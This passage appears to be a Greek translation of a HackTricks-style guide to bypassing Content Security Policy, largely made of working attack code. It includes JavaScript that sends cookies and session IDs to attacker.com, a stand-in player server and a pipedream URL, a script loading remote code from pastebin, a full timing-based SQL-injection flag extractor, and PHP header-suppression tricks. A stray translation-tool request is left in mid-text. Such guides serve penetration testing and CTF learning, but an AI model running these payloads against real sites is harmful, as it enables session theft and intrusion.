Μπορείτε να παρακάμψετε αυτό το CSP εξάγοντας τα δεδομένα μέσω εικόνων (σε αυτήν την περίπτωση το XSS εκμεταλλεύεται ένα CSRF όπου μια σελίδα προσβάσιμη από το bot περιέχει ένα SQLi, και εξάγει το flag μέσω μιας εικόνας):
```javascript
<script>
fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
Image().src='http://PLAYER_SERVER/?'+_)
</script>
```
From: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Μπορείτε επίσης να εκμεταλλευτείτε αυτή τη ρύθμιση για να **φορτώσετε javascript κώδικα που έχει εισαχθεί μέσα σε μια εικόνα**. Για παράδειγμα, αν η σελίδα επιτρέπει τη φόρτωση εικόνων από Twitter, μπορείτε να **δημιουργήσετε** μια **ειδική εικόνα**, να την **ανεβάσετε** στο Twitter και να εκμεταλλευτείτε το "**unsafe-inline**" για να **εκτελέσετε** έναν JS κώδικα (σαν κανονικό XSS) που θα **φορτώσει** την **εικόνα**, θα **εξαγάγει** το **JS** από αυτή και θα το **εκτελέσει**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Με Service Workers

Η συνάρτηση `importScripts` των Service workers δεν περιορίζεται από το CSP:


{{#ref}}
../xss-cross-site-scripting/abusing-service-workers.md
{{#endref}}

### Policy Injection

Έρευνα: [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Εάν μια **παράμετρος** που αποστέλλετε **επικολλάται μέσα** στη **δήλωση** της **πολιτικής**, τότε μπορείτε να **τροποποιήσετε** την **πολιτική** με κάποιο τρόπο που την καθιστά **άχρηστη**. Μπορείτε να **επιτρέψετε** το script 'unsafe-inline' με οποιοδήποτε από αυτά τα bypasses:
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Επειδή αυτή η οδηγία θα **επικαλύψει τα υπάρχοντα script-src directives**.\
Μπορείς να βρεις ένα παράδειγμα εδώ: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Στο Edge είναι πολύ πιο απλό. Αν μπορείς να προσθέσεις στο CSP απλά αυτό: **`;_`** **Edge** θα **απορρίψει** ολόκληρη την **πολιτική**.\
Παράδειγμα: [http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](<http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E>)

### img-src \*; μέσω XSS (iframe) - Time attack

Παρατήρησε την έλλειψη της οδηγίας `'unsafe-inline'`\
Αυτή τη φορά μπορείς να κάνεις το θύμα να **φορτώσει** μια σελίδα υπό **τον έλεγχό σου** μέσω **XSS** με ένα `<iframe`. Αυτή τη φορά θα κάνεις το θύμα να προσπελάσει τη σελίδα από όπου θέλεις να εξάγεις πληροφορίες (**CSRF**). Δεν μπορείς να προσπελάσεις το περιεχόμενο της σελίδας, αλλά αν με κάποιο τρόπο μπορείς να **ελέγξεις τον χρόνο που χρειάζεται η σελίδα για να φορτώσει**, μπορείς να εξάγεις τις πληροφορίες που χρειάζεσαι.

Αυτή τη φορά θα εξαχθεί ένα **flag** — κάθε φορά που ένα **char** μανεύεται σωστά μέσω **SQLi**, η **απάντηση** παίρνει **περισσότερο χρόνο** λόγω της συνάρτησης **sleep**. Έτσι θα μπορέσεις να εξάγεις το flag:
```html
<!--code from https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // The bot will load an URL with the payload
<script>
let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
function gen(x) {
x = escape(x.replace(/_/g, "\\_"))
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
}

function gen2(x) {
x = escape(x)
return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Μέσω Bookmarklets

Αυτή η επίθεση προϋποθέτει κάποια social engineering όπου ο attacker **πείθει τον χρήστη να σύρει και να αφήσει έναν σύνδεσμο πάνω στο bookmarklet του browser**. Το bookmarklet αυτό θα περιέχει **κακόβουλο javascript** code που όταν γίνει drag\&dropped ή κλικ θα εκτελεστεί στο context του τρέχοντος web window, **παρακάμπτοντας την CSP και επιτρέποντας την κλοπή ευαίσθητων πληροφοριών** όπως cookies ή tokens.

For more information [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### Παράκαμψη CSP με περιορισμό της CSP

In [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), η CSP παρακάμπτεται με την έγχυση μέσα σε ένα επιτρεπόμενο iframe μιας πιο περιοριστικής CSP που απαγόρευε το φόρτωμα ενός συγκεκριμένου JS file το οποίο, στη συνέχεια, μέσω **prototype pollution** ή **dom clobbering** επέτρεπε το **abuse a different script to load an arbitrary script**.

Μπορείτε να **περιορίσετε την CSP ενός Iframe** με το **`csp`** attribute:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
In [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), ήταν δυνατό μέσω **HTML injection** να **πιο περιοριστικό** ένα **CSP**, έτσι ώστε ένα script που απέτρεπε το CSTI να απενεργοποιηθεί και επομένως η **vulnerability became exploitable.**\
Το CSP μπορεί να γίνει πιο περιοριστικό χρησιμοποιώντας **HTML meta tags** και τα inline scripts μπορούν να απενεργοποιηθούν **αφαιρώντας** την **entry** που επιτρέπει το **nonce** τους και **επιτρέποντας συγκεκριμένο inline script μέσω sha**:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration with Content-Security-Policy-Report-Only

Αν καταφέρεις να κάνεις τον server να απαντήσει με το header **`Content-Security-Policy-Report-Only`** με μια **τιμή που ελέγχεται από εσένα** (ίσως λόγω CRLF), μπορείς να το κάνεις να δείχνει στο server σου και αν **περιβάλεις** το **JS content** που θέλεις να exfiltrate με **`<script>`**, και επειδή είναι πολύ πιθανόν ότι το `unsafe-inline` δεν επιτρέπεται από το CSP, αυτό θα **προκαλέσει σφάλμα CSP** και μέρος του script (που περιέχει τις ευαίσθητες πληροφορίες) θα σταλεί στο server μέσω του `Content-Security-Policy-Report-Only`.

For an example [**check this CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking Information with CSP and Iframe

- Ένα `iframe` δημιουργείται που δείχνει σε ένα URL (ας το ονομάσουμε `https://example.redirect.com`) το οποίο επιτρέπεται από CSP.
- Αυτό το URL στη συνέχεια ανακατευθύνει σε ένα μυστικό URL (π.χ., `https://usersecret.example2.com`) που **δεν επιτρέπεται** από CSP.
- Ακούγοντας το event `securitypolicyviolation`, μπορεί κάποιος να συλλάβει την ιδιότητα `blockedURI`. Αυτή η ιδιότητα αποκαλύπτει το domain του blocked URI, εκθέτοντας το μυστικό domain στο οποίο ανακατεύθηκε το αρχικό URL.

Είναι ενδιαφέρον ότι browsers όπως οι Chrome και Firefox έχουν διαφορετική συμπεριφορά στην αντιμετώπιση των iframes σε σχέση με το CSP, οδηγώντας σε πιθανή έκθεση ευαίσθητων πληροφοριών λόγω μη ορισμένης συμπεριφοράς.

Μια άλλη τεχνική περιλαμβάνει την εκμετάλλευση του CSP για να εξαχθεί το μυστικό subdomain. Αυτή η μέθοδος βασίζεται σε έναν αλγόριθμο δυαδικής αναζήτησης και στην προσαρμογή του CSP ώστε να συμπεριλαμβάνει συγκεκριμένα domains που αποκλείονται σκόπιμα. Για παράδειγμα, αν το μυστικό subdomain αποτελείται από άγνωστους χαρακτήρες, μπορείς επαναληπτικά να δοκιμάσεις διαφορετικά subdomains τροποποιώντας την οδηγία CSP για να μπλοκάρεις ή να επιτρέψεις αυτά τα subdomains. Εδώ υπάρχει ένα snippet που δείχνει πώς το CSP μπορεί να ρυθμιστεί για να διευκολύνει αυτή τη μέθοδο:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Παρακολουθώντας ποιες αιτήσεις αποκλείονται ή επιτρέπονται από το CSP, μπορεί κανείς να περιορίσει τους πιθανούς χαρακτήρες στο μυστικό υποτομέα, αποκαλύπτοντας τελικά το πλήρες URL.

Και οι δύο μέθοδοι εκμεταλλεύονται τις αποχρώσεις στην υλοποίηση του CSP και τη συμπεριφορά των browsers, δείχνοντας πώς οι φαινομενικά ασφαλείς πολιτικές μπορεί ακούσια να leak ευαίσθητες πληροφορίες.

Trick from [**here**](https://ctftime.org/writeup/29310).

## Μη ασφαλείς τεχνολογίες για παράκαμψη του CSP

### PHP Σφάλματα όταν υπάρχουν πάρα πολλές παράμετροι

Σύμφωνα με την [**τελευταία τεχνική που σχολίαζεται σε αυτό το βίντεο**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), η αποστολή υπερβολικών παραμέτρων (1001 GET parameters αν και μπορείτε επίσης να το κάνετε με POST params και με περισσότερα από 20 files). Οποιοδήποτε ορισμένο **`header()`** στον PHP web κώδικα **δεν θα σταλεί** λόγω του σφάλματος που θα προκληθεί.

### Υπερφόρτωση buffer απάντησης της PHP

Η PHP είναι γνωστή ότι κάνει buffering της απάντησης στα 4096 bytes από προεπιλογή. Επομένως, αν η PHP εμφανίζει μια προειδοποίηση, παρέχοντας **αρκετά δεδομένα μέσα στις προειδοποιήσεις**, η **απάντηση** θα **σταλεί** **πριν** το **CSP header**, με αποτέλεσμα το header να αγνοηθεί.\
Η τεχνική ουσιαστικά συνίσταται στο **γέμισμα του response buffer με προειδοποιήσεις** ώστε το CSP header να μην σταλεί.

Idea from [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Kill CSP via max_input_vars (headers already sent)

Επειδή τα headers πρέπει να σταλούν πριν από οποιαδήποτε έξοδο, οι προειδοποιήσεις που παράγει η PHP μπορούν να ακυρώσουν μετέπειτα κλήσεις `header()`. Αν τα δεδομένα χρήστη υπερβούν το `max_input_vars`, η PHP εκτυπώνει πρώτα μια startup warning· οποιαδήποτε επακόλουθη `header('Content-Security-Policy: ...')` θα αποτύχει με “headers already sent”, απενεργοποιώντας ουσιαστικά το CSP και επιτρέποντας reflective XSS που διαφορετικά θα ήταν μπλοκαρισμένο.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
Please paste the README.md content from src/pentesting-web/content-security-policy-csp-bypass/ that you want translated into Greek.
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Επανεγραφή Σελίδας Σφάλματος

Από [**this writeup**](https://blog.ssrf.kr/69) φαίνεται ότι ήταν δυνατό να γίνει bypass μιας προστασίας CSP φορτώνοντας μια σελίδα σφάλματος (πιθανώς χωρίς CSP) και επανεγράφοντας το περιεχόμενό της.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME είναι μια τεχνική που εκμεταλλεύεται ένα XSS (ή πολύ περιορισμένο XSS) **σε ένα endpoint μιας σελίδας** για να **εκμεταλλευτεί** **άλλα endpoints της ίδιας origin.** Αυτό γίνεται φορτώνοντας το ευάλωτο endpoint από μια σελίδα επιτιθέμενου και στη συνέχεια ανανεώνοντας τη σελίδα επιτιθέμενου στο πραγματικό endpoint στην ίδια origin που θέλετε να εκμεταλλευτείτε. Με αυτόν τον τρόπο το **vulnerable endpoint** μπορεί να χρησιμοποιήσει το αντικείμενο **`opener`** στο **payload** για να **έχει πρόσβαση στο DOM** του **real endpoint to abuse**. Για περισσότερες πληροφορίες δείτε:

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Επιπλέον, **wordpress** έχει ένα **JSONP** endpoint στο `/wp-json/wp/v2/users/1?_jsonp=data` που θα **reflect** τα **data** που στέλνονται στην έξοδο (με τον περιορισμό ότι επιτρέπονται μόνο γράμματα, αριθμοί και τελείες).

Ένας επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό το endpoint για να **generate a SOME attack** εναντίον του WordPress και να **embed** αυτό μέσα στο `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` σημειώστε ότι αυτό το **script** θα είναι **loaded** επειδή επιτρέπεται από **'self'**. Επιπλέον, και επειδή το WordPress είναι εγκατεστημένο, ένας επιτιθέμενος μπορεί να εκμεταλλευτεί τη **SOME attack** μέσω του **vulnerable** **callback** endpoint που **bypasses the CSP** για να δώσει περισσότερα προνόμια σε έναν χρήστη, να εγκαταστήσει νέο plugin...\  
Για περισσότερες πληροφορίες σχετικά με το πώς να πραγματοποιήσετε αυτή την επίθεση δείτε [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

Αν υπάρχει αυστηρό CSP που δεν σας επιτρέπει να **interact with external servers**, υπάρχουν μερικά πράγματα που μπορείτε πάντα να κάνετε για να exfiltrate the information.

### Location

Μπορείτε απλά να αλλάξετε το location για να στείλετε στον server του επιτιθέμενου τις μυστικές πληροφορίες:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta tag

Μπορείτε να ανακατευθύνετε με την εισαγωγή ενός meta tag (πρόκειται απλώς για ανακατεύθυνση, αυτό δεν θα leak περιεχόμενο)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

Για να φορτώνουν οι σελίδες πιο γρήγορα, οι browsers προεπιλύουν hostnames σε IP addresses και τα αποθηκεύουν στην cache για μετέπειτα χρήση.\
Μπορείτε να υποδείξετε σε έναν browser να προ-επιλύσει ένα hostname με: `<link rel="dns-prefetch" href="something.com">`

Μπορείτε να εκμεταλλευτείτε αυτή τη συμπεριφορά για να **εξαγάγετε ευαίσθητες πληροφορίες μέσω DNS requests**:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
Ένας άλλος τρόπος:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
Για να αποφευχθεί αυτό, ο server μπορεί να στείλει το HTTP header:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν λειτουργεί σε headless browsers (bots)

### WebRTC

Σε πολλές σελίδες μπορείτε να διαβάσετε ότι **το WebRTC δεν ελέγχει την πολιτική `connect-src` του CSP**.

Στην πραγματικότητα μπορείτε να _leak_ πληροφορίες χρησιμοποιώντας ένα _DNS request_. Δείτε αυτόν τον κώδικα:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
Μια άλλη επιλογή:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

Το αναδυόμενο παράθυρο διαπιστευτηρίων στέλνει ένα DNS αίτημα προς το iconURL χωρίς να περιορίζεται από τη σελίδα. Λειτουργεί μόνο σε ασφαλές περιβάλλον (HTTPS) ή σε localhost.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## Έλεγχος Πολιτικών CSP στο διαδίκτυο

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## Αυτόματη δημιουργία CSP

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Αναφορές

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
